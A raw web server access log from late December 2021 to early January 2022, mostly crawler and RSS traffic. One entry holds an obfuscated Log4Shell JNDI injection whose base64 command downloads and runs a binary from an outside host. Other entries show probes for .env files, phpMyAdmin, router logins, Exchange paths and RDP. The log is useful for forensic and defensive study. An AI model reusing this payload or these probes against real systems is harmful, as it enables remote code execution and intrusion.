66.249.74.29 - - [31/Dec/2021:20:12:51 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5978 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
118.123.105.67 - - [31/Dec/2021:20:31:46 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
118.123.105.67 - - [31/Dec/2021:20:31:46 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:11 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:12 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:13 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:14 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:14 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:15 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:16 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [31/Dec/2021:20:32:17 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
199.127.60.104 - - [31/Dec/2021:20:38:46 +0100] "GET / HTTP/1.1" 301 162 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}')"
198.98.49.124 - - [31/Dec/2021:21:07:31 +0100] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
136.144.41.117 - - [31/Dec/2021:21:10:00 +0100] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
35.195.93.98 - - [31/Dec/2021:21:11:08 +0100] "GET / HTTP/1.1" 200 595 "-" "python-requests/2.26.0"
195.133.40.56 - - [31/Dec/2021:21:18:04 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.40.56 - - [31/Dec/2021:21:18:04 +0100] "" 400 0 "-" "-"
66.249.74.27 - - [31/Dec/2021:21:45:57 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.74.29 - - [31/Dec/2021:21:45:57 +0100] "GET /weekly-stories-3/ HTTP/1.1" 200 15592 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
189.14.34.145 - - [31/Dec/2021:21:53:43 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
102.223.80.57 - - [31/Dec/2021:22:26:42 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.168.77.6 - - [31/Dec/2021:23:02:19 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
207.46.13.229 - - [31/Dec/2021:23:03:02 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.80 - - [31/Dec/2021:23:03:10 +0100] "GET /rss/ HTTP/2.0" 200 3420 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
205.185.114.93 - - [31/Dec/2021:23:14:08 +0100] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 400 150 "-" "-"
66.249.74.25 - - [31/Dec/2021:23:20:25 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.74.27 - - [31/Dec/2021:23:20:53 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5973 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.100 - - [31/Dec/2021:23:30:07 +0100] "GET /sitemap-pages.xml HTTP/2.0" 200 426 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
195.133.40.56 - - [01/Jan/2022:00:00:58 +0100] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
195.133.40.56 - - [01/Jan/2022:00:00:58 +0100] "" 400 0 "-" "-"
23.224.186.187 - - [01/Jan/2022:00:02:25 +0100] "GET / HTTP/1.1" 200 1345 "-" "-"
23.224.186.187 - - [01/Jan/2022:00:02:47 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Go-http-client/1.1"
23.224.186.187 - - [01/Jan/2022:00:02:48 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Go-http-client/1.1"
23.224.186.187 - - [01/Jan/2022:00:02:49 +0100] "GET /sitemap.xml HTTP/1.1" 200 595 "-" "Go-http-client/1.1"
66.249.74.25 - - [01/Jan/2022:00:05:25 +0100] "GET /weekly-stories-3/amp/ HTTP/1.1" 200 6240 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.149.125.164 - - [01/Jan/2022:00:15:40 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
180.149.125.164 - - [01/Jan/2022:00:15:41 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
192.241.213.120 - - [01/Jan/2022:00:18:57 +0100] "GET /owa/auth/x.js HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.213.164 - - [01/Jan/2022:00:20:42 +0100] "GET /owa/auth/logon.aspx HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.212.44 - - [01/Jan/2022:00:22:36 +0100] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
66.249.74.27 - - [01/Jan/2022:00:35:26 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
24.173.125.28 - - [01/Jan/2022:00:36:48 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
24.173.125.28 - - [01/Jan/2022:00:36:50 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.161.91.191 - - [01/Jan/2022:00:44:19 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
54.161.91.191 - - [01/Jan/2022:00:44:20 +0100] "GET /rss/ HTTP/1.1" 200 3432 "-" "Ruby"
198.98.49.124 - - [01/Jan/2022:00:49:41 +0100] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
66.249.74.27 - - [01/Jan/2022:00:59:13 +0100] "GET /sitemap.xml HTTP/1.1" 200 642 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
78.128.112.18 - - [01/Jan/2022:01:24:39 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
5.173.42.32 - - [02/Jan/2022:11:32:35 +0100] "GET /rss/ HTTP/2.0" 200 3432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:11:32:36 +0100] "GET /content/images/2021/12/Weekly-1.png HTTP/2.0" 200 286095 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:11:32:36 +0100] "GET /content/images/2021/12/Weekly.png HTTP/2.0" 200 286095 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:11:32:36 +0100] "GET /content/images/2021/11/Weekly.png HTTP/2.0" 200 286095 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:11:32:36 +0100] "GET /content/images/2021/10/image-2.png HTTP/2.0" 200 18100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:11:32:36 +0100] "GET /content/images/2021/10/obraz_2021-10-02_103514.png HTTP/2.0" 200 14588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:11:32:37 +0100] "GET /content/images/2021/10/Screenshot_8.png HTTP/2.0" 200 243714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:11:32:37 +0100] "GET /content/images/2021/10/image-1.png HTTP/2.0" 200 18781 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:12:02:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
125.64.94.140 - - [02/Jan/2022:12:16:55 +0100] "GET / HTTP/1.0" 200 1345 "-" "-"
125.64.94.140 - - [02/Jan/2022:12:16:56 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:12:16:58 +0100] "GET /robots.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:12:16:59 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:07 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
118.123.105.67 - - [02/Jan/2022:12:17:07 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:08 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:09 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:10 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:11 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:12 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:13 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:12:17:14 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
5.173.42.32 - - [02/Jan/2022:12:17:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:12:32:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
35.172.134.235 - - [02/Jan/2022:12:44:50 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
35.172.134.235 - - [02/Jan/2022:12:44:51 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Ruby"
5.173.42.32 - - [02/Jan/2022:12:47:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
66.249.70.27 - - [02/Jan/2022:12:51:33 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.25 - - [02/Jan/2022:12:51:34 +0100] "GET /weekly-stories-3/amp/ HTTP/1.1" 200 6246 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.173.42.32 - - [02/Jan/2022:13:02:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
209.141.58.146 - - [02/Jan/2022:13:03:03 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
66.249.70.25 - - [02/Jan/2022:13:11:00 +0100] "GET /sitemap-tags.xml HTTP/1.1" 200 458 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.173.42.32 - - [02/Jan/2022:13:17:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
118.123.105.67 - - [02/Jan/2022:13:31:06 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
118.123.105.67 - - [02/Jan/2022:13:31:06 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:13:31:07 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:13:31:08 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:13:31:09 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:13:31:10 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:13:31:10 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:13:31:11 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [02/Jan/2022:13:31:12 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
5.173.42.32 - - [02/Jan/2022:13:32:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
64.225.29.147 - - [02/Jan/2022:13:36:46 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
64.225.29.147 - - [02/Jan/2022:13:36:47 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
209.141.53.99 - - [02/Jan/2022:13:37:00 +0100] "GET /favicon.ico HTTP/2.0" 200 583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
152.32.177.232 - - [02/Jan/2022:13:39:14 +0100] "\x16\x03\x01\x00\xAF\x01\x00\x00\xAB\x03\x03m\xCF8\xB3\xDA/\x83\xCE\xC9d\xE7P\xF69\xCDd6i\xA9\xDB\xA5@o\xA0\xE0\x1D\xA1\x9E\xB4\xB2\xB6{\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
152.32.177.232 - - [02/Jan/2022:13:39:27 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
152.32.177.232 - - [02/Jan/2022:13:40:01 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.177.232 - - [02/Jan/2022:13:40:07 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Go-http-client/1.1"
152.32.177.232 - - [02/Jan/2022:13:40:16 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Go-http-client/1.1"
152.32.177.232 - - [02/Jan/2022:13:40:21 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Go-http-client/1.1"
152.32.177.232 - - [02/Jan/2022:13:40:28 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Go-http-client/1.1"
152.32.177.232 - - [02/Jan/2022:13:40:34 +0100] "GET /sitemap.xml HTTP/1.1" 301 162 "-" "Go-http-client/1.1"
152.32.177.232 - - [02/Jan/2022:13:40:41 +0100] "GET /sitemap.xml HTTP/1.1" 200 595 "http://85.255.1.106/sitemap.xml" "Go-http-client/1.1"
125.64.94.140 - - [02/Jan/2022:13:42:28 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
125.64.94.140 - - [02/Jan/2022:13:42:29 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:13:42:30 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:13:42:32 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:13:42:35 +0100] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:13:42:35 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:13:42:36 +0100] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:13:42:37 +0100] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [02/Jan/2022:13:42:38 +0100] "GET /.well-known/security.txt HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
5.173.42.32 - - [02/Jan/2022:13:47:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:14:02:36 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:14:17:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
64.62.197.32 - - [02/Jan/2022:14:18:29 +0100] "GET / HTTP/1.1" 200 1345 "-" "-"
207.46.13.100 - - [02/Jan/2022:14:27:05 +0100] "GET / HTTP/2.0" 200 13133 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.173.42.32 - - [02/Jan/2022:14:32:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
167.248.133.59 - - [02/Jan/2022:14:34:26 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
167.248.133.59 - - [02/Jan/2022:14:34:27 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.59 - - [02/Jan/2022:14:34:27 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
5.173.42.32 - - [02/Jan/2022:14:47:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
5.173.42.32 - - [02/Jan/2022:15:02:35 +0100] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33"
185.191.171.36 - - [02/Jan/2022:15:09:10 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.21 - - [02/Jan/2022:15:09:10 +0100] "GET /weekly-stories-3/ HTTP/1.1" 200 15593 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
205.185.114.93 - - [02/Jan/2022:15:13:12 +0100] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 400 150 "-" "-"
